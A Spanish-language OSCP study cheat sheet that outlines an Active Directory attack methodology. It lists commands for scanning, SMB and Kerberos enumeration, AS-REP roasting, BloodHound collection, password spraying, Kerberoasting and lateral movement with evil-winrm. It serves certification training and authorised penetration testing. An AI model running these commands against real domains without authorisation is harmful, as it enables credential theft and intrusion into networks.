Metodología de Active Directory para OSCP

Esta metodología sigue el enfoque esperado en el examen OSCP: enumeración profunda, abuso de configuraciones incorrectas y escalada progresiva de privilegios.

1. Enumeración inicial (sin credenciales)

Objetivo: Identificar el dominio, el Domain Controller y los servicios expuestos.

Escaneo de red

nmap -p- -sS -T4 <IP>
nmap -sC -sV -p <puertos> <IP>
  • Kerberos (88)
  • LDAP (389 / 636)
  • SMB (445)
  • DNS (53)

SMB

smbclient -L //<IP> -N
smbmap -H <IP>
enum4linux -a <IP>

Kerberos

kerbrute userenum -d dominio.local users.txt --dc <IP>
GetNPUsers.py dominio.local/ -no-pass -usersfile users.txt

2. Enumeración con credenciales válidas

Objetivo: Mapear completamente el dominio.

Validar credenciales

crackmapexec smb <IP> -u user -p pass

Enumeración AD

crackmapexec smb <IP> -u user -p pass --users
crackmapexec smb <IP> -u user -p pass --groups
crackmapexec smb <IP> -u user -p pass --shares

BloodHound

bloodhound-python -u user -p pass -d dominio.local -ns <IP> -c all
Clave OSCP: Buscar caminos a Domain Admin, ACLs abusables y relaciones de privilegio indirectas.

3. Ataques comunes a Active Directory

Password Spraying

kerbrute passwordspray -d dominio.local users.txt 'Password123'

Kerberoasting

GetUserSPNs.py dominio.local/user:pass -request

Permisos peligrosos

  • GenericAll
  • WriteDACL
  • WriteOwner
  • GPOs mal configuradas

4. Movimiento lateral

evil-winrm -i <IP> -u user -p pass
crackmapexec smb <IP> -u user -p pass
